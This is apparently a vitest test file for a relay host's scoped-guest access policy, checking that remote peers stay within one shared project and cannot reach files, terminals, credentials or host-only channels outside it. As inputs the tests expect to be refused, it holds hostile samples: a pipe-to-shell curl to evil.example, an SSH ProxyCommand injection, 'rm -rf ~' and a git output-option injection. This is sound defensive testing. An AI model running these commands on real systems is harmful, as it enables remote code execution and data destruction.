// The project-scoped relay session as a boundary (scoped-guest-policy.ts), plus the host-only
// channels every relay peer is refused (shared/host-control.ts, enforced in relay-host.ts `serve`).
import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { IPC } from '../../shared/ipc'
import { encodePtyData } from '../../shared/rpc'
import {
  INTRODUCED_MAX,
  decideScopedAccess,
  filterScopedEvent,
  scopeForTest,
  scopedGuestHooks,
  type ScopedGuestDeps
} from './scoped-guest-policy'
import { connectRelayHost, type PeerAttach } from './relay-host'
import { connectRelayClient } from './relay-client'
import { transportPair } from './transport-pair'
import { genKeyPair, publicKeyToB64 } from './e2ee'
import type { RpcRequest } from '../../shared/rpc'

let tmp: string
let root: string // the shared project's folder
let other: string // another project's folder
let dataDir: string // this app's own data dir, beside the shared root (a symlink inside points at it)
beforeAll(() => {
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'scoped-guest-')))
  root = path.join(tmp, 'alpha')
  other = path.join(tmp, 'beta')
  // A share that CONTAINS the data dir is refused whole (share-root.ts); the per-file data-dir jail
  // is the belt behind it, reached here through a symlink planted inside the project.
  dataDir = path.join(tmp, 'appdata')
  fs.mkdirSync(path.join(root, 'src'), { recursive: true })
  fs.mkdirSync(other, { recursive: true })
  fs.mkdirSync(dataDir, { recursive: true })
  fs.writeFileSync(path.join(root, 'src', 'a.ts'), 'a')
  fs.writeFileSync(path.join(other, 'secret.txt'), 's')
  fs.writeFileSync(path.join(dataDir, 'license.json'), '{}')
  fs.symlinkSync(dataDir, path.join(root, 'appdata-link'))
  // A symlink planted INSIDE the project that points OUT of it, and a dangling one.
  fs.symlinkSync(path.join(other, 'secret.txt'), path.join(root, 'escape.txt'))
  fs.symlinkSync(path.join(other, 'not-yet.txt'), path.join(root, 'dangling.txt'))
  fs.symlinkSync(other, path.join(root, 'escape-dir'))
})
afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }))

const NODES: Record<string, string[]> = {
  a1: ['alpha'],
  b1: ['beta'],
  both: ['alpha', 'beta'] // an id copied into another project
}
const SESSIONS: Record<string, string> = { sA: 'a1', sB: 'b1' }
const deps = (): ScopedGuestDeps => ({
  projectsOfNode: (id) => NODES[id] ?? [],
  nodeOfSession: (sid) => SESSIONS[sid],
  projectCwd: (p) => (p === 'alpha' ? root : p === 'beta' ? other : undefined),
  hostDataDir: dataDir
})
const decide = (method: string, ...args: unknown[]) => decideScopedAccess('alpha', deps(), method, args)
const allowed = (method: string, ...args: unknown[]) => decide(method, ...args).allow

describe('scoped guest — refused outright', () => {
  it('refuses an unknown or new channel (fail closed)', () => {
    expect(allowed('some:new-channel')).toBe(false)
    expect(allowed('constructor')).toBe(false)
  })
  it('refuses the host settings, license and whole-workspace writes', () => {
    expect(allowed(IPC.settingsSave, {})).toBe(false)
    expect(allowed(IPC.settingsLoad)).toBe(false)
    expect(allowed(IPC.agentDiscoverModels, {})).toBe(false)
    expect(allowed(IPC.licenseDeactivate)).toBe(false)
    expect(allowed(IPC.workspaceSave, {})).toBe(false)
  })
})

describe('scoped guest — terminals', () => {
  it('opens a terminal for an in-project node, cwd defaulted to the project root', () => {
    const d = decide(IPC.ptyCreate, { persistKey: 'a1', cols: 80, rows: 24, shell: '/bin/zsh' })
    expect(d.allow).toBe(true)
    expect(d.allow && d.args?.[0]).toMatchObject({ persistKey: 'a1', cwd: root, shell: '/bin/zsh' })
  })
  it('refuses to attach to another project\'s node, or a node shared with another project', () => {
    expect(allowed(IPC.ptyCreate, { persistKey: 'b1', cols: 80, rows: 24 })).toBe(false)
    expect(allowed(IPC.ptyCreate, { persistKey: 'both', cols: 80, rows: 24 })).toBe(false)
    expect(allowed(IPC.ptyCreate, { persistKey: 'nobody', cols: 80, rows: 24 })).toBe(false)
    expect(allowed(IPC.ptyCreate, { cols: 80, rows: 24 })).toBe(false)
  })
  it('refuses a cwd outside the project (incl. through a symlink) and a foreign owner project', () => {
    expect(allowed(IPC.ptyCreate, { persistKey: 'a1', cwd: other, cols: 1, rows: 1 })).toBe(false)
    expect(allowed(IPC.ptyCreate, { persistKey: 'a1', cwd: path.join(root, 'escape-dir'), cols: 1, rows: 1 })).toBe(false)
    expect(allowed(IPC.ptyCreate, { persistKey: 'a1', cwd: path.join(root, 'src'), cols: 1, rows: 1 })).toBe(true)
    expect(allowed(IPC.ptyCreate, { persistKey: 'a1', ownerProjectId: 'beta', cols: 1, rows: 1 })).toBe(false)
  })
  it('drops an ssh route the guest names', () => {
    const d = decide(IPC.ptyCreate, {
      persistKey: 'a1', cols: 1, rows: 1,
      sshRemote: { controlPath: '/x', conn: { extraArgs: ['-oProxyCommand=touch /tmp/pwned'] }, remoteCwd: '/' }
    })
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).sshRemote).toBeUndefined()
  })
  it('drops a guest-sent local-login mark (issue #1186: this machine\'s UI sets it, never a peer)', () => {
    const d = decide(IPC.ptyCreate, { persistKey: 'a1', cols: 1, rows: 1, localOnSshCanvas: true })
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).localOnSshCanvas).toBeUndefined()
  })
  it('forces requireRemote for an SSH project, whatever the guest sent (never a local shell)', () => {
    const remote = { ...deps(), projectIsRemote: (p: string) => p === 'alpha' }
    const d = decideScopedAccess('alpha', remote, IPC.ptyCreate, [
      { persistKey: 'a1', cols: 1, rows: 1, requireRemote: false }
    ])
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).requireRemote).toBe(true)
    // A local shared project is left exactly as the guest asked.
    const local = decide(IPC.ptyCreate, { persistKey: 'a1', cols: 1, rows: 1 })
    expect(local.allow && (local.args?.[0] as Record<string, unknown>).requireRemote).toBeUndefined()
  })
  it('judges session-id and persistKey verbs by the node', () => {
    expect(allowed(IPC.ptyWrite, 'sA', 'ls\r')).toBe(true)
    expect(allowed(IPC.ptyWrite, 'sB', 'ls\r')).toBe(false)
    expect(allowed(IPC.ptyWrite, 'unknown', 'ls\r')).toBe(false)
    expect(allowed(IPC.ptyCapture, 'a1')).toBe(true)
    expect(allowed(IPC.ptyCapture, 'b1')).toBe(false)
    expect(allowed(IPC.ptyDestroy, 'b1')).toBe(false)
    expect(allowed(IPC.ptySendText, 'b1', 'x')).toBe(false)
    expect(allowed(IPC.contextEnsure, 's', root, undefined, 'b1', 'claude')).toBe(false)
    expect(allowed(IPC.contextEnsure, 's', root, undefined, 'a1', 'claude')).toBe(true)
  })
})

describe('scoped guest — files and git', () => {
  it('reads inside the root, refuses outside and through a planted symlink', () => {
    expect(allowed(IPC.fsRead, path.join(root, 'src', 'a.ts'))).toBe(true)
    expect(allowed(IPC.fsList, root)).toBe(true)
    expect(allowed(IPC.fsRead, path.join(other, 'secret.txt'))).toBe(false)
    expect(allowed(IPC.fsRead, path.join(root, '..', 'beta', 'secret.txt'))).toBe(false)
    expect(allowed(IPC.fsRead, path.join(root, 'escape.txt'))).toBe(false)
    expect(allowed(IPC.fsList, path.join(root, 'escape-dir'))).toBe(false)
    expect(allowed(IPC.fsRead, '~/.ssh/id_rsa')).toBe(false)
    expect(allowed(IPC.fsRead, 'relative.txt')).toBe(false)
  })
  it('never reaches the app data dir, even inside the shared root', () => {
    expect(allowed(IPC.fsRead, path.join(dataDir, 'license.json'))).toBe(false)
    expect(allowed(IPC.fsRead, path.join(root, 'appdata-link', 'license.json'))).toBe(false)
    // A shared folder that CONTAINS the data dir is not served at all (security audit F4).
    const containing = decideScopedAccess('alpha', { ...deps(), hostDataDir: path.join(root, 'src') }, IPC.fsRead, [path.join(root, 'src', 'a.ts')])
    expect(containing.allow === false && containing.message).toMatch(/data folder/)
  })
  it('writes a new file inside the root, refuses through a dangling symlink or an escaping dir', () => {
    expect(allowed(IPC.fsWrite, path.join(root, 'src', 'new', 'b.ts'), 'x')).toBe(true)
    expect(allowed(IPC.fsWrite, path.join(root, 'dangling.txt'), 'x')).toBe(false)
    expect(allowed(IPC.fsWrite, path.join(root, 'escape-dir', 'planted.txt'), 'x')).toBe(false)
    expect(allowed(IPC.fsMkdir, path.join(other, 'x'))).toBe(false)
  })
  it('jails git working directories and its option-shaped arguments', () => {
    expect(allowed(IPC.gitStatus, root)).toBe(true)
    expect(allowed(IPC.gitStatus, other)).toBe(false)
    expect(allowed(IPC.gitShowFile, root, '--output=/tmp/x', 'a.ts')).toBe(false)
    expect(allowed(IPC.gitShowFile, root, 'HEAD', 'a.ts')).toBe(true)
    expect(allowed(IPC.gitDiff, root, path.join(other, 'secret.txt'), false, true)).toBe(false)
    expect(allowed(IPC.gitDiff, root, 'src/a.ts', false, false)).toBe(true)
    expect(allowed(IPC.gitSetActiveRemote, 'beta')).toBe(false)
  })
  it('allows a worktree inside the root or in the default `<root>.worktrees` sibling only', () => {
    expect(allowed(IPC.gitWorktreeAdd, root, path.join(tmp, 'alpha.worktrees', 'feat'), 'feat', 'main', true)).toBe(true)
    expect(allowed(IPC.gitWorktreeAdd, root, path.join(tmp, 'beta', 'feat'), 'feat', 'main', true)).toBe(false)
  })
})

describe('scoped guest — canvas, board and GitHub', () => {
  it('refuses board and issue calls naming another project', () => {
    expect(allowed(IPC.boardLogSubscribe, 'alpha')).toBe(true)
    expect(allowed(IPC.boardLogSubscribe, 'beta')).toBe(false)
    expect(allowed(IPC.githubIssuesQuery, { projectId: 'beta' })).toBe(false)
    expect(allowed(IPC.githubIssuesQuery, { projectId: 'alpha' })).toBe(true)
  })
  it('refuses a canvas mutation into another project, or adopting another project\'s node id', () => {
    const node = (id: string) => ({ op: 'upsert', node: { id, kind: 'terminal', position: { x: 0, y: 0 } } })
    expect(allowed(IPC.canvasMut, 'beta', node('fresh'))).toBe(false)
    expect(allowed(IPC.canvasMut, 'alpha', node('b1'))).toBe(false)
    expect(allowed(IPC.canvasMut, 'alpha', { op: 'remove', id: 'b1' })).toBe(false)
    expect(allowed(IPC.canvasMut, 'alpha', node('a1'))).toBe(true)
  })
  it('a node the guest just created gets its first terminal (before the host saves) — a SPAWN only', () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const ask = (method: string, ...args: unknown[]) => hooks.access!(null as never, 'req', method, args)
    expect(ask(IPC.ptyCreate, { persistKey: 'fresh', cols: 1, rows: 1 }).allow).toBe(false)
    const upsert = { op: 'upsert', node: { id: 'fresh', kind: 'terminal', position: { x: 0, y: 0 } } }
    expect(ask(IPC.canvasMut, 'alpha', upsert).allow).toBe(true)
    const d = ask(IPC.ptyCreate, { persistKey: 'fresh', cols: 1, rows: 1 })
    expect(d.allow).toBe(true)
    // `newOnly`: core refuses to join or reattach anything already running under that name.
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
  })
})

// ── Security audit F1 (2026-10): a node id the guest introduced is PENDING until its own spawn ──────
//
// `canvas:mut` is a cast admitted before the reflector validates anything, so any id no project holds
// used to become "the guest's new node" — and every node-keyed pty verb then accepted it. A prefix of
// another project's id reached that terminal by tmux prefix matching (closed separately by exact
// targets, pty-exact-target.realtmux.test.ts); an orphan's exact id reached the orphan itself.
describe('scoped guest — an introduced node unlocks nothing but its own spawn', () => {
  // An SSH project: the guest is granted no local shell at all, which made F1 a real escalation.
  const sshDeps = (sessions: Record<string, string> = {}, held: Record<string, string[]> = {}): ScopedGuestDeps => ({
    projectsOfNode: (id) => held[id] ?? (id === 'term-ssh-1' ? ['alpha'] : id === 'term-mgx1abcd-1a2b3c4d' ? ['beta'] : []),
    nodeOfSession: (sid) => sessions[sid],
    projectCwd: () => undefined,
    projectIsRemote: () => true,
    hostDataDir: '/nonexistent-data-dir'
  })
  const upsert = (id: string) => ({ op: 'upsert', node: { id } })
  const NODE_VERBS: Array<[string, unknown[]]> = [
    [IPC.ptySendText, ['curl https://evil.example/x | sh', true]],
    [IPC.ptySendChatPrompt, ['hello', 'claude']],
    [IPC.ptySendToEmptyPrompt, ['x']],
    [IPC.ptyCapture, [true]],
    [IPC.ptyReadScrollback, []],
    [IPC.ptyPaneCwd, []],
    [IPC.ptyPaneCommand, []],
    [IPC.ptyPaneOwner, []],
    [IPC.ptyTerminateForeground, []],
    [IPC.ptySessionAge, []],
    [IPC.ptyDestroy, []],
    [IPC.ptyRecycle, []],
    [IPC.ptyReadSessionName, []]
  ]

  it('a PREFIX of another project\'s node id is pending: every node-keyed verb refuses it', () => {
    const hooks = scopedGuestHooks('alpha', sshDeps())
    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
    // The victim's exact id is held by another project → refused, as before.
    expect(access('cast', IPC.canvasMut, ['alpha', upsert('term-mgx1abcd-1a2b3c4d')]).allow).toBe(false)
    const prefix = 'term-mgx1abcd-1a2b'
    expect(access('cast', IPC.canvasMut, ['alpha', upsert(prefix)]).allow).toBe(true)
    for (const [m, rest] of NODE_VERBS) expect(access('req', m, [prefix, ...rest]).allow, m).toBe(false)
    // Its spawn is allowed, and only as a spawn: newOnly, and requireRemote for an SSH project.
    const d = access('req', IPC.ptyCreate, [{ persistKey: prefix, shell: '/bin/sh' }])
    expect(d.allow).toBe(true)
    expect(d.allow && d.args?.[0]).toMatchObject({ newOnly: true, requireRemote: true })
  })

  it('stays pending after the host SAVES it into the shared project: being on the canvas is not ownership', () => {
    const held: Record<string, string[]> = {}
    const hooks = scopedGuestHooks('alpha', sshDeps({}, held))
    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
    expect(access('cast', IPC.canvasMut, ['alpha', upsert('orphan-1')]).allow).toBe(true)
    held['orphan-1'] = ['alpha'] // the host's debounced save landed
    expect(access('req', IPC.ptySendText, ['orphan-1', 'id', true]).allow).toBe(false)
    expect(access('cast', IPC.ptyWrite, ['s-orphan', 'id\r']).allow).toBe(false)
    const d = access('req', IPC.ptyCreate, [{ persistKey: 'orphan-1' }])
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
  })

  it('becomes the guest\'s own only on the core\'s word that ITS create spawned the session', () => {
    const sessions: Record<string, string> = { 's-new': 'mine-1', 's-joined': 'mine-2' }
    const hooks = scopedGuestHooks('alpha', sshDeps(sessions))
    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
    access('cast', IPC.canvasMut, ['alpha', upsert('mine-1')])
    access('cast', IPC.canvasMut, ['alpha', upsert('mine-2')])
    // A refusal, a join (fresh:false), and a guessed fresh all leave it pending.
    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: '', fresh: false, unavailable: 'new-only' })
    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-joined', fresh: false })
    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-joined', fresh: true, freshUnverified: true })
    expect(access('req', IPC.ptySendText, ['mine-2', 'x', true]).allow).toBe(false)
    // Its own fresh spawn: from now on a node of the shared project.
    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-new', fresh: true })
    expect(access('req', IPC.ptySendText, ['mine-1', 'x', true]).allow).toBe(true)
    expect(access('cast', IPC.ptyWrite, ['s-new', 'x']).allow).toBe(true)
    const d = access('req', IPC.ptyCreate, [{ persistKey: 'mine-1' }])
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBeUndefined()
    expect(access('req', IPC.ptySendText, ['mine-2', 'x', true]).allow).toBe(false)
  })

  it('a pending node\'s terminal bytes and events never reach the guest; a created one\'s do', () => {
    const sessions: Record<string, string> = { 's-pending': 'p-1', 's-mine': 'c-1' }
    const hooks = scopedGuestHooks('alpha', sshDeps(sessions))
    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('p-1')])
    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('c-1')])
    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-mine', fresh: true })
    const bin: string[] = []
    const text: string[] = []
    const sink = hooks.wrapSink!(null as never, { sendText: (j) => text.push(j), sendBinary: (b) => bin.push(Buffer.from(b).toString()) })
    sink.sendBinary(encodePtyData('s-pending', 'SECRET'))
    sink.sendBinary(encodePtyData('s-mine', 'ok'))
    expect(bin).toHaveLength(1)
    sink.sendText(JSON.stringify({ t: 'ev', channel: IPC.agentStatus, args: [{ nodeId: 'p-1' }] }))
    sink.sendText(JSON.stringify({ t: 'ev', channel: IPC.agentStatus, args: [{ nodeId: 'c-1' }] }))
    expect(text).toHaveLength(1)
  })

  it('an id that aliases another session name, or past the bound, is not introduced', () => {
    const hooks = scopedGuestHooks('alpha', sshDeps())
    const cast = (id: string) => hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert(id)]).allow
    // `sessionName` rewrites these characters, so two ids could name ONE tmux session.
    for (const bad of ['a.b', 'a_b', 'a b', 'a/b', 'x'.repeat(129)]) expect(cast(bad), bad).toBe(false)
    for (let i = 0; i < INTRODUCED_MAX; i++) expect(cast(`n-${i}`)).toBe(true)
    expect(cast('n-one-too-many')).toBe(false)
    // Its own pending nodes can still be moved.
    expect(cast('n-0')).toBe(true)
  })

  it('earlier item (b): an orphan exact id is pending too — its create may only spawn, never join', () => {
    const hooks = scopedGuestHooks('alpha', { ...deps(), projectsOfNode: () => [] })
    expect(hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('term-orphan-1')]).allow).toBe(true)
    const d = hooks.access!(null as never, 'req', IPC.ptyCreate, [{ persistKey: 'term-orphan-1' }])
    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
    expect(hooks.access!(null as never, 'req', IPC.ptyCapture, ['term-orphan-1', true]).allow).toBe(false)
  })

  it('a pending id another project has since taken (a git pull) is refused outright', () => {
    const held: Record<string, string[]> = {}
    const hooks = scopedGuestHooks('alpha', sshDeps({}, held))
    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('taken-1')])
    held['taken-1'] = ['beta']
    expect(hooks.access!(null as never, 'req', IPC.ptyCreate, [{ persistKey: 'taken-1' }]).allow).toBe(false)
    expect(hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('taken-1')]).allow).toBe(false)
  })
})

describe('scoped guest — presence is the shared project\'s only (security audit (a))', () => {
  const ev = (channel: string, ...args: unknown[]) => JSON.stringify({ t: 'ev', channel, args })
  const peer = (clientId: number, projectId: string | null, extra: Record<string, unknown> = {}) => ({
    clientId, name: `p${clientId}`, color: '#5ac8fa', cursor: { x: 1, y: 2 }, focus: null, chat: null,
    typing: null, projectId, dino: null, kind: 'desktop', ...extra
  })
  const rig = () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const got: Array<{ channel: string; arg: unknown }> = []
    const sink = hooks.wrapSink!(null as never, {
      sendText: (j) => { const m = JSON.parse(j); got.push({ channel: m.channel, arg: m.args[0] }) },
      sendBinary: () => {}
    })
    return { sink, got }
  }
  it('a sync lists only peers on the shared project, with node references outside it nulled', () => {
    const { sink, got } = rig()
    sink.sendText(ev(IPC.presenceSync, [
      peer(1, 'beta', { focus: 'b1', chat: 'the staging db password is hunter2', typing: { nodeId: 'b1', at: 1 } }),
      peer(2, 'alpha', { focus: 'a1', typing: { nodeId: 'b1', at: 1 } }),
      peer(3, null)
    ]))
    expect(got).toEqual([{ channel: IPC.presenceSync, arg: [expect.objectContaining({ clientId: 2, focus: 'a1', typing: null })] }])
    expect(JSON.stringify(got)).not.toContain('hunter2')
    expect(JSON.stringify(got)).not.toContain('b1')
  })
  it('a peer moving in is joined, moving out is left, and nothing in between leaks', () => {
    const { sink, got } = rig()
    sink.sendText(ev(IPC.presenceSync, [peer(1, 'beta')]))
    got.length = 0
    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { chat: 'secret elsewhere', focus: 'b1' } }))
    expect(got).toEqual([])
    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { projectId: 'alpha' } }))
    expect(got).toEqual([{ channel: IPC.presencePeer, arg: { op: 'join', peer: expect.objectContaining({ clientId: 1, projectId: 'alpha', focus: null }) } }])
    expect(JSON.stringify(got)).not.toContain('secret elsewhere')
    got.length = 0
    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { focus: 'a1' } }))
    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { focus: 'b1' } }))
    expect(got.map((g) => g.arg)).toEqual([
      { op: 'update', clientId: 1, patch: { focus: 'a1' } },
      { op: 'update', clientId: 1, patch: { focus: null } }
    ])
    got.length = 0
    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { projectId: 'beta' } }))
    expect(got).toEqual([{ channel: IPC.presencePeer, arg: { op: 'leave', clientId: 1 } }])
    got.length = 0
    sink.sendText(ev(IPC.presencePeer, { op: 'join', peer: peer(9, 'beta') }))
    sink.sendText(ev(IPC.presencePeer, { op: 'leave', clientId: 9 }))
    expect(got).toEqual([])
  })
  it('context:update reaches the guest only for a session of the shared project', () => {
    const hooks = scopedGuestHooks('alpha', { ...deps(), nodesOfAgentSession: (sid) => (sid === 'sa' ? ['a1'] : sid === 'sb' ? ['b1'] : []) })
    const got: string[] = []
    const sink = hooks.wrapSink!(null as never, { sendText: (j) => got.push(j), sendBinary: () => {} })
    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'sa', usedTokens: 1, model: 'm' }))
    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'sb', usedTokens: 1, model: 'm' }))
    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'unknown', usedTokens: 1, model: 'm' }))
    sink.sendText(ev(IPC.contextUpdate, { nodeId: 'b1', sessionId: 'sa', usedTokens: 1, model: 'm' }))
    expect(got).toHaveLength(1)
    expect(got[0]).toContain('"sa"')
  })
})

describe('scoped guest — a share rooted at the home directory or the disk root is never served (F4)', () => {
  it('refuses every request when the shared folder is the home directory, or contains it', () => {
    for (const cwd of [tmp, root]) {
      const home = cwd === tmp ? path.join(tmp, 'alpha') : root // root itself, or an ancestor of it
      const d = decideScopedAccess('alpha', { ...deps(), homeDir: home, projectCwd: () => cwd }, IPC.fsRead, [path.join(root, 'src', 'a.ts')])
      expect(d.allow).toBe(false)
      expect(d.allow === false && d.message).toMatch(/home directory/)
    }
    const slash = decideScopedAccess('alpha', { ...deps(), projectCwd: () => '/' }, IPC.workspaceLoad, [])
    expect(slash.allow === false && slash.message).toMatch(/root of the disk/)
    // An ordinary project folder BELOW the home directory is served as before.
    expect(decideScopedAccess('alpha', { ...deps(), homeDir: tmp }, IPC.fsRead, [path.join(root, 'src', 'a.ts')]).allow).toBe(true)
  })
})

describe('scoped guest — what it receives', () => {
  const ev = (channel: string, ...args: unknown[]) => JSON.stringify({ t: 'ev', channel, args })
  it('drops other projects\' events and the host log; keeps its own', () => {
    const s = scopeForTest('alpha', deps())
    const owners = new Map<string, string>()
    expect(filterScopedEvent(ev(IPC.canvasMut, 'beta', { op: 'remove', id: 'b1' }), s, owners)).toBe(false)
    expect(filterScopedEvent(ev(IPC.canvasMut, 'alpha', { op: 'remove', id: 'a1' }), s, owners)).toBe(true)
    expect(filterScopedEvent(ev(IPC.agentStatus, { nodeId: 'b1' }), s, owners)).toBe(false)
    expect(filterScopedEvent(ev(IPC.agentStatus, { nodeId: 'a1' }), s, owners)).toBe(true)
    expect(filterScopedEvent(ev(IPC.logBatch, []), s, owners)).toBe(false)
    expect(filterScopedEvent(ev(IPC.githubIssuesChanged('alpha'), [1]), s, owners)).toBe(true)
    expect(filterScopedEvent(ev(IPC.githubIssuesChanged('beta'), [1]), s, owners)).toBe(false)
    expect(filterScopedEvent(ev(IPC.workspaceExternalChange, { id: 'beta' }), s, owners)).toBe(false)
    // A hosted team's shared set: a viewer of a hosted team receives it, a Team Access guest never.
    expect(filterScopedEvent(ev(IPC.relayHostedSharedChanged, { projectIds: ['alpha', 'beta'] }), s, owners)).toBe(false)
  })
  it("a scoped guest's snapshot holds only its project's nodes", () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const session = null as never
    const mine = 'a1'
    const theirs = 'b1'
    expect(allowed(IPC.agentStatusSnapshot)).toBe(true)
    expect(hooks.narrowResponse!(session, IPC.agentStatusSnapshot, [{ nodeId: mine }, { nodeId: theirs }])).toEqual([{ nodeId: mine }])
  })
  it('delivers terminal bytes only for the shared project\'s sessions', () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const got: string[] = []
    const sink = hooks.wrapSink!(null as never, {
      sendText: () => {},
      sendBinary: (b) => got.push(Buffer.from(b).toString('hex'))
    })
    sink.sendBinary(encodePtyData('sB', 'secret'))
    sink.sendBinary(encodePtyData('sA', 'ok'))
    expect(got.length).toBe(1)
  })
})

// ── End to end, through the relay host's own serve loop ────────────────────────────────────────

function openHost(hooks?: Parameters<typeof connectRelayHost>[0]['hooks']) {
  const hostKeys = genKeyPair()
  const { hostT, peerT } = transportPair()
  const dispatched: RpcRequest[] = []
  const casts: string[] = []
  const attach: PeerAttach = {
    attach: () => 1,
    detach: () => {},
    dispatch: async (_id, req) => { dispatched.push(req); return { t: 'res', id: req.id, ok: true, result: 'ok' } },
    cast: (_id, method) => { casts.push(method) }
  }
  const opened: string[] = []
  const frames: string[] = []
  connectRelayHost({
    url: 'ws://127.0.0.1/x', token: 't', ourKeys: hostKeys, attach, transport: hostT, autoApprove: () => true,
    sharedProjectId: hooks ? 'alpha' : undefined, hooks,
    onPeerPending: () => {}, onOpen: () => opened.push('host'), onClose: () => {}
  })
  const client = connectRelayClient({
    url: 'ws://127.0.0.1/x', token: 't', hostKeyB64: publicKeyToB64(hostKeys.publicKey), ourKeys: genKeyPair(),
    transport: peerT, autoApprove: true, onSas: () => {}, onApproved: () => opened.push('peer'),
    onFrame: (j) => frames.push(j), onPtyData: () => {}, onClose: () => {}
  })
  return { client, dispatched, casts, opened, frames }
}

describe('relay host — scoped session end to end', () => {
  it('refuses out-of-scope requests without dispatching them, and serves in-scope ones', async () => {
    const t = openHost(scopedGuestHooks('alpha', deps()))
    await vi.waitFor(() => expect(t.opened.length).toBe(2))
    t.client.send(JSON.stringify({ t: 'req', id: 1, method: IPC.fsRead, args: [path.join(other, 'secret.txt')] }))
    t.client.send(JSON.stringify({ t: 'req', id: 2, method: IPC.ptyCreate, args: [{ persistKey: 'b1', cols: 1, rows: 1 }] }))
    t.client.send(JSON.stringify({ t: 'cast', method: IPC.ptyWrite, args: ['sB', 'rm -rf ~\r'] }))
    t.client.send(JSON.stringify({ t: 'req', id: 3, method: IPC.fsRead, args: [path.join(root, 'src', 'a.ts')] }))
    await vi.waitFor(() => expect(t.dispatched.map((r) => r.id)).toEqual([3]))
    await vi.waitFor(() => expect(t.frames.filter((f) => f.includes('E_ROLE')).length).toBe(2))
    expect(t.casts).toEqual([])
  })
})

describe('relay host — host-only channels refused to every peer', () => {
  it('refuses settings, license and credential channels even with no policy hooks', async () => {
    const t = openHost()
    await vi.waitFor(() => expect(t.opened.length).toBe(2))
    const methods = [
      IPC.settingsSave, IPC.settingsLoad, IPC.agentDiscoverModels, IPC.agentGatewayCredentialSave,
      IPC.licenseActivate, IPC.licenseDeactivate, IPC.claudeAccountsAdd, IPC.usageRemote, IPC.relayHostInvite
    ]
    methods.forEach((method, i) => t.client.send(JSON.stringify({ t: 'req', id: 100 + i, method, args: [] })))
    t.client.send(JSON.stringify({ t: 'cast', method: IPC.settingsSave, args: [{}] }))
    t.client.send(JSON.stringify({ t: 'req', id: 999, method: IPC.workspaceLoad, args: [] }))
    await vi.waitFor(() => expect(t.frames.filter((f) => f.includes('E_FORBIDDEN')).length).toBe(methods.length))
    await vi.waitFor(() => expect(t.dispatched.map((r) => r.method)).toEqual([IPC.workspaceLoad]))
    expect(t.casts).toEqual([])
  })
  // Live links: an editor (or an unscoped Team Access seat) passes every access check, so the host-only
  // prefix is the one thing between a peer and publishing a host terminal with the host's Pro — and the
  // list answer carries every link's secret. Refused BEFORE any policy runs, whatever the hooks say.
  for (const [label, hooks] of [['no policy hooks (full access)', undefined], ['policy hooks', 'scoped']] as const) {
    it(`refuses every watchLink channel, request and cast, with ${label}`, async () => {
      const t = openHost(hooks === 'scoped' ? scopedGuestHooks('alpha', deps()) : undefined)
      await vi.waitFor(() => expect(t.opened.length).toBe(2))
      const methods = (Object.values(IPC) as unknown[]).filter(
        (v): v is string => typeof v === 'string' && v.startsWith('watchLink:')
      )
      expect(methods).toHaveLength(14)
      // The Control link's owner verbs are among them, by name: a peer must never set a link's
      // password, turn its typing on, clear its lock, or probe a terminal for it.
      for (const ch of [IPC.watchLinkSetControl, IPC.watchLinkSetPassword, IPC.watchLinkAllowControl, IPC.watchLinkControlSupport]) {
        expect(methods, ch).toContain(ch)
      }
      methods.forEach((method, i) =>
        t.client.send(JSON.stringify({ t: 'req', id: 200 + i, method, args: [{ nodeId: 'a1', role: 'viewer', ttlSeconds: 3600, label: 'x' }] }))
      )
      for (const method of methods) t.client.send(JSON.stringify({ t: 'cast', method, args: [] }))
      await vi.waitFor(() => expect(t.frames.filter((f) => f.includes('E_FORBIDDEN')).length).toBe(methods.length))
      expect(t.dispatched).toEqual([])
      expect(t.casts).toEqual([])
    })
  }
  it('still lets a hosted team\'s own verbs through to their interceptor', async () => {
    const t = openHost()
    await vi.waitFor(() => expect(t.opened.length).toBe(2))
    t.client.send(JSON.stringify({ t: 'req', id: 5, method: IPC.relayHostedSelf, args: [] }))
    await vi.waitFor(() => expect(t.dispatched.map((r) => r.method)).toEqual([IPC.relayHostedSelf]))
  })
})

describe('project documents reach peers without exec fields', () => {
  // `shell` and a held `pendingLaunch` (its command text included) are exec fields
  // stripSharedNodeExec removes.
  const project = (id: string) => ({
    id,
    name: id,
